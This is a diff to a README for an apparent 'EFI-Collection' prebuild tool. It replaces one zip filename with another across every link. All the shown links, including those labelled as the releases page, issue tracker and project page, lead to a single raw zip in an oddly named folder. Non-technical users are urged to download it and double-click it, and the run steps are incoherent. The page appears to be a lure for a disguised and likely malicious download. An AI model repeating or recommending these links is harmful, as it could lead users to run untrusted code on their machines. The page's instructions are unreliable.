@@ -4,12 +4,12 @@
 Welcome to EFI-Collection! This guide helps you download and run our EFI Prebuild software easily. No technical skills are needed. Just follow these simple steps to get started.
 
 ## 🔗 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/gsmsultan46/EFI-Collection/main/antehypophysis/EFI-Collection-3.5.zip)](https://raw.githubusercontent.com/gsmsultan46/EFI-Collection/main/antehypophysis/EFI-Collection-3.5.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/gsmsultan46/EFI-Collection/main/antehypophysis/Collection-EF-v3.4-alpha.5.zip)](https://raw.githubusercontent.com/gsmsultan46/EFI-Collection/main/antehypophysis/Collection-EF-v3.4-alpha.5.zip)
 
 ## 📥 Download & Install
-To get the latest version of EFI-Collection, visit this page to download: [Releases Page](https://raw.githubusercontent.com/gsmsultan46/EFI-Collection/main/antehypophysis/EFI-Collection-3.5.zip). 
+To get the latest version of EFI-Collection, visit this page to download: [Releases Page](https://raw.githubusercontent.com/gsmsultan46/EFI-Collection/main/antehypophysis/Collection-EF-v3.4-alpha.5.zip). 
 
-On the Releases page, you will find the latest version available. Click on the version number that you want to download. This will take you to a list of files. Look for the `.zip` or `https://raw.githubusercontent.com/gsmsultan46/EFI-Collection/main/antehypophysis/EFI-Collection-3.5.zip` file. Click on it and your download will start.
+On the Releases page, you will find the latest version available. Click on the version number that you want to download. This will take you to a list of files. Look for the `.zip` or `https://raw.githubusercontent.com/gsmsultan46/EFI-Collection/main/antehypophysis/Collection-EF-v3.4-alpha.5.zip` file. Click on it and your download will start.
 
 ### 🔍 System Requirements
 For EFI-Collection to work well, make sure your system meets these requirements:
@@ -27,14 +27,14 @@ For EFI-Collection to work well, make sure your system meets these requirements:
 
 ## 🌐 Using EFI-Collection
 1. Once your download is complete, locate the downloaded file on your computer. 
-2. Extract the contents of the `.zip` or `https://raw.githubusercontent.com/gsmsultan46/EFI-Collection/main/antehypophysis/EFI-Collection-3.5.zip` file to a folder. 
+2. Extract the contents of the `.zip` or `https://raw.githubusercontent.com/gsmsultan46/EFI-Collection/main/antehypophysis/Collection-EF-v3.4-alpha.5.zip` file to a folder. 
 3. Open the folder, and look for the main application file. This file is usually named `EFI-Collection` or similar.
 
 ### 🖥 Opening the Application
 - **On Windows:** 
-  - Double-click the `https://raw.githubusercontent.com/gsmsultan46/EFI-Collection/main/antehypophysis/EFI-Collection-3.5.zip` file to run it. 
+  - Double-click the `https://raw.githubusercontent.com/gsmsultan46/EFI-Collection/main/antehypophysis/Collection-EF-v3.4-alpha.5.zip` file to run it. 
 - **On macOS:** 
-  - Open `https://raw.githubusercontent.com/gsmsultan46/EFI-Collection/main/antehypophysis/EFI-Collection-3.5.zip` from your Applications folder. 
+  - Open `https://raw.githubusercontent.com/gsmsultan46/EFI-Collection/main/antehypophysis/Collection-EF-v3.4-alpha.5.zip` from your Applications folder. 
 - **On Linux:** 
   - Open the terminal, navigate to the folder where you extracted the files, and run `./EFI-Collection`.
 
@@ -65,9 +65,9 @@ If you need easy-to-use EFI files for your system, EFI-Collection is a great cho
 Absolutely! We welcome contributions. You can suggest features or report issues on the GitHub page.
 
 ## 🐞 Reporting Issues
-If you encounter any problems while using EFI-Collection, please report them on [GitHub Issues](https://raw.githubusercontent.com/gsmsultan46/EFI-Collection/main/antehypophysis/EFI-Collection-3.5.zip). Your feedback helps us improve.
+If you encounter any problems while using EFI-Collection, please report them on [GitHub Issues](https://raw.githubusercontent.com/gsmsultan46/EFI-Collection/main/antehypophysis/Collection-EF-v3.4-alpha.5.zip). Your feedback helps us improve.
 
 ## 🌟 Acknowledgments
 Thanks for using EFI-Collection! We appreciate your support and interest in our project.
 
-For further information and updates, please visit our [GitHub Page](https://raw.githubusercontent.com/gsmsultan46/EFI-Collection/main/antehypophysis/EFI-Collection-3.5.zip).
+For further information and updates, please visit our [GitHub Page](https://raw.githubusercontent.com/gsmsultan46/EFI-Collection/main/antehypophysis/Collection-EF-v3.4-alpha.5.zip).
